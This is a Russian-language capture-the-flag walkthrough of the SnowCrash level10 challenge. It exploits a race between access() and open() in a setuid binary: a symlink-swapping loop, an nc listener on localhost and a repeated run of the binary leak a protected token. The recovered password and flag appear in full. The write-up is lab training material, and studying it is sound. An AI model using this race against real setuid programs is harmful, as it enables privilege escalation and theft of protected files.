
Попытавшись запустить видим что бинарник ждет файл и хоста
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it


Узнаем нужный порт
./level10 /bin/getflag 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1

Через ltrace находим, что бинарник делет access
level10@SnowCrash:~$ ltrace ./level10 token 12
__libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                         = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)           = 31
+++ exited (status 31) ++

Открыв man находим
NOTES
       Warning:  Using access() to check if a user is authorized to, for example, open a file
       before actually doing so using open(2) creates a security hole, because the user might
       exploit  the  short  time interval between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be avoided.  (In the  example
       just  described,  a  safer  alternative  would  be to temporarily switch the process's
       effective user ID to the real ID and then call open(2).)





level10@SnowCrash:~$ ./level10 /tmp/link 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!


nc -lk localhost 6969

.*( )*.
aa



В одном терминале постоянно меняем ссылку, чтобы попасть в этот промежуток времени между access и open
level10@SnowCrash:~$ while true; do ln -fs ~/token /tmp/link; ln -fs ~/level10 /tmp/link; done

Во втором терминале открываем хост на нужном порту
level10@SnowCrash:~$ nc -lk localhost 6969


В третьем терминале запускаем скрипт
level10@SnowCrash:~$ while true; do ./level10 /tmp/link 127.0.0.1; done

...
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. Damn. Unable to open fileUnable to read from file: %s
wrote file!You don't have access to %s
;0����Lx���p��������������zR� P���F
                                   J
��                                  tx?;*2$"@�����B
  8`|���a�A
           �A�A�N0JA�A
                      ��A�������������������
���o�Ё                                      Є
�
 �H������o���o(.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
^C
...


Среди вывода находим пароль от flag10
woupa2yuojeeaaed06riuj63c


level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$
